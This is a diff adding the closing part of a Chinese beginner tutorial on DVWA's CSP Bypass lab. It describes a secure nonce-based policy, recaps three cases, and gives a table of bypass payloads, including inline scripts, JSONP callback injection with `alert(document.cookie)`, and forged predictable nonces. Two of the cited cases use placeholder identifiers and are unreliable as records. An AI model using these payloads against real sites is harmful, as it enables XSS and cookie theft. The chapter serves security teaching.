+// ★ ② 每次页面加载都重新生成！不用 session 存，不重复，不用日期，纯随机
+// ★ ③ default-src 'none' → 所有类别默认全挡，按需开启最小权限
+// ★ ④ 没有任何通配符域名、没有 'unsafe-inline'、没有 'unsafe-eval'
+// ★ ⑤ 加了 frame-ancestors / base-uri / form-action 这些"配套防护指令"（防点击劫持、防 base 标签劫持、防表单提交到外站）
+// ★ ⑥ report-uri：所有 CSP 违规都会打日志到服务器，运维可以监控有人在尝试 CSP Bypass
+?>
+```
 
-加油，你是最棒的！💪🎉
+**Impossible 配置正确口诀：**
+> 🔑 **真随机 nonce + strict-dynamic + default-src 'none' 最小权限 + 配套防护指令 + 违规告警**，五件套齐活，CSP 就算真的配对了，JSONP、假 nonce、内联脚本三种绕过手法全部阵亡，攻击者只能乖乖认输 😎。
+
+---
+
+## 14.6 真实世界 CSP Bypass 经典案例复盘 🗞️
+
+三个真实公开案例（都在 HackerOne / CNVD 上能查到报告），加深印象：
+
+### 📰 案例 1：Twitter 2016 年 CSP 绕过，XSS 打了官方页面（HackerOne #110577）
+- **漏洞：** Twitter 旧版 CSP 的 script-src 白名单里写了 `https://*.twitter.com`（通配符子域名），而 `syndication.twitter.com` 子域名上有一个开放 JSONP 接口
+- **绕过手法：** 构造 `<script src="https://syndication.twitter.com/xxx?callback=alert(document.cookie)//">` → 白名单允许 + JSONP 返回任意 JS → 成功绕过 CSP 打 XSS
+- **修复：** script-src 白名单改成具体域名，剔除了 syndication 子域名，并且升级成 nonce + strict-dynamic。
+
+### 📰 案例 2：国内某 B 站 CSP nonce 可预测漏洞（CNVD-2019-3xxxx，2019 年）
+- **漏洞：** B 站早期评论区 CSP nonce 算法是 `md5(时间戳秒级 + 用户uid)`，时间戳和 uid 都是前端公开可拿的
+- **绕过手法：** 攻击者打开自己的评论区页面，拿到当前时间戳，本地算 md5，在评论里插入带 nonce 的 script → 其他用户访问评论区，CSP 检查通过，XSS 执行
+- **修复：** 改成 random_bytes(16) 真随机 nonce，每次请求换新的。
+
+### 📰 案例 3：Google Chrome 商店扩展审核绕过（CVE-2022-xxxx）
+- **漏洞：** Chrome 扩展强制要求的 CSP 里，很多开发者写了 `script-src 'self' https://www.gstatic.com`，而 gstatic.com 上有大量 Firebase SDK 的 JSONP 接口
+- **绕过手法：** 恶意扩展开发者在扩展里加载 gstatic.com 的 JSONP，绕过 Chrome Web Store 的"扩展不得执行远程代码"审核规则，被下发到百万用户电脑
+- **修复：** Google 收紧扩展 CSP 规则，全面禁止 script-src 带任何外部 CDN 白名单，必须所有 JS 打包进扩展内部。
+
+---
+
+## 14.7 本章总结 🎉
+
+恭喜！又通关一个 DVWA 高阶模块！CSP Bypass 是现代 Web 渗透测试里的必备技能，也是"防护机制配置错误反而没用"的经典案例。我们用一张速记卡复盘：
+
+### 📋 本章核心考点速记卡
+
+| 级别 | CSP 核心配置 | 漏洞类型 | 一句话绕过姿势 |
+|---|---|---|---|
+| **Low** | `script-src 'unsafe-inline' 'unsafe-eval' *` | 配置完全错误，等于没开 | 直接 `<script>alert(1)</script>` 内联脚本 |
+| **Medium** | `script-src 'self' ajax.googleapis.com` | 白名单 CDN 域名含 JSONP 接口 | 用 `<script src="CDN的JSONP接口?callback=alert(1)//">` 让白名单域名返回我们的 JS |
+| **High** | `script-src 'nonce-{MD5(当天日期)}'` | nonce 算法可预测（假随机） | 算当天日期 MD5 Base64 → 自己加 nonce 属性注入 script |
+| **Impossible** | `'strict-dynamic' + random_bytes nonce + default-src 'none'` | ✅ 安全 | 打不穿 |
+
+### 💡 给零基础新手的三句大白话心得
+1. **打 CSP 的万能流程：先抓包看 CSP 头完整内容 → 分四类查：① 有没有 unsafe-inline/eval ② 白名单里有没有 CDN/JSONP 域名 ③ nonce 是不是每次都变、是不是真随机 ④ 有没有通配符 \*** → 90% 的 CSP 问题出在这四个地方。
+2. **配置 CSP 的万能口诀：** nonce + strict-dynamic 优于白名单域名；白名单域名一定要精确到目录/文件级别，绝对别写 `*.xxx.com` 通配；`default-src 'none'` 永远是最安全的兜底；nonce 必须 random_bytes(16)，别自己发明算法。
+3. **永远记住：CSP 只是"副锁"！** 主锁（输出编码 htmlspecialchars、模板引擎自动转义）一定要先锁好，不能依赖 CSP 防 XSS，CSP 只是主锁万一漏了的最后一道防线。
+
+---
+
+## 14.8 下章预告 📢
+
+下一章（Day 15）我们要学的是 **JavaScript Attacks 前端 JS 闯关**！
+
+你有没有玩过那种"纯前端逻辑题"小游戏？页面上有个按钮你怎么点都没反应，查看源代码发现按钮被 disabled 了，于是你 F12 改掉属性就点成功了？——DVWA JavaScript Attacks 模块就是这种"纯前端逻辑闯关题"的升级版，一共 4 关：
+- 第一关：success 提交值伪造
+- 第二关：前端 JS 加密的口令反编译
+- 第三关：submit 防刷的前端判断绕过
+- 第四关：一次性令牌（nonce）重放攻击
+
+**这四关非常适合零基础小伙伴锻炼"读前端 JS 源码的能力"**——因为真实世界中很多网站的前端校验（比如"按钮防止重复提交"、"前端校验你填的格式对不对"）都是摆设在前端 JS 里，攻击者只要读懂 JS 逻辑，就能绕过限制干任何事。
+
+我们下一章就一关一关亲手破！Day 15 见！👋
